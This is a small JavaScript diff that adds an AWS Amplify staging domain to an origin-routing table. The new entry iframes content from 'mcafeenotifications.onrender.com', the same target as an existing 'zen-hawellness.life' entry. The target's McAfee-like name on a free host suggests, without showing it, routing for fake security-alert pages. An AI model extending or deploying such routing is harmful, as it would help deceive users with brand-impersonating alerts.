@@ -100,6 +100,7 @@ const ORIGIN_GROUPS = {
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://staging.d38r0fqdz8kjft.amplifyapp.com": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
   },
 };
 
